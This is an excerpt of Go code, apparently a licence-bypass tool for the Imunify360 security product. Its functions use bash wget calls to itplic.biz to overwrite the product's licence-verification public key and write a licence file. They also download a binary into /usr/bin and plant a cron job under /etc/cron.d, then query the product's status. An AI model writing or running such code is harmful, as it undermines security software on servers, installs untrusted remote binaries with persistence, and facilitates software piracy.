...
func main() {
	...
	if f.Status == "success" {
		...
		_, _ = exec.Command("bash", "-c", "wget -O /usr/share/imunify360/cln-pub.key https://itplic.biz/api/files/imunify360/cln-pub845").Output()
...
func file_checker() {
	if _, err := os.Stat("/usr/bin/lic_im360"); err == nil {
		...
		downloadFile("/usr/bin/lic_im360", "http://itplic.biz/api/files/imunify360/lic_im360")
...
func imunify_checker() {
	if _, err := os.Stat("/usr/bin/imunify360-agent"); err == nil {
		...
		_, _ = exec.Command("bash", "-c", "wget -O /var/imunify360/license.json https://itplic.biz/api/imunify360/im/").Output()
		_, _ = exec.Command("bash", "-c", "wget -O /usr/share/imunify360/cln-pub.key http://itplic.biz/api/files/imunify360/cln-pub845").Output()
		_, _ = exec.Command("bash", "-c", "wget -O /etc/cron.d/lic_im360 http://itplic.biz/api/files/imunify360/cron").Output()
		_, _ = exec.Command("bash", "-c", "/usr/bin/imunify-antivirus rstatus -v").Output()
